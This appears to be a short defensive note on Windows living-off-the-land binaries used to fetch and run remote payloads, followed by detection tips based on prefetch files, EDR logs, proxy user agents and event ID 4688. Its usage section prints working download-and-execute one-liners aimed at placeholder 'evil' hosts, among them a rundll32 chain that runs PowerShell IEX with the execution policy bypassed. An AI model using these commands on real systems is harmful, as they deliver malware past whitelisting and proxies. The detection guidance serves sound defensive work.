Living Off the Land techniques for exploitation are popular among both sophisticated and unsophisticated adversaries. 
Adversaries predominantly may use below windows utilities to download any executables and bypass security devices or proxy  or
application whitelisting etc.
Their use reduces the likelihood of detection and may increase the required investigation time.

Windows Utilities:
certutil
Regsvr32
MSHTA
Powershell
msiexec
wmic
rundll32.exe


Usage :
mshta.exe https[:]//evil/evil[.]hta
mshta evil[.]hta
regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
MSIEXEC /j m evil[.]msi
msiexec /q /i http[:]//evil/evil[.]msi 
wmic os get /FORMAT:"http://evil/evil[.]xsl"
rundll3.exe \\evil\evil.dll,0
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop 
 -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil/evil.sct');"
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject
    ("script:https[:]//www[.]example[.]com/malicious.sct")" 
Powershell:Invoke-WebRequest -Uri $url -OutFile $outpu
Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output
Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous


Detection:
1.Look for these utilities prefetch files and Parsing the prefetch will provide the executed file. 
2.Command execution and arguments passed to these utilities using EDR solutions.
3.Look for the HTTP useragents with regsvr32/mshta/certuril in the network recorders or the proxy logs.
Certutil - useragent as CertUtil 
MSIEXEC - Windows Installer
WMIC -Http request for file/page ending with XSL from proxy log or Network recorder
Powershell-Mozilla/5.0 (Windows NT; Windows NT 6.3; en-US) WindowsPowerShell/4.0
4.Look for suspicious process in the system with parent process as these utilities.
5.Look for event id 4688 and its process command argument to track these exceutable with the above syntax.

Note: Auditing policy for process tracking have to be enabled to trigger 4688 event id and in Advanced Audit Configuration ,
  Detailed Tracking have to be enabled for recording process command arguments.
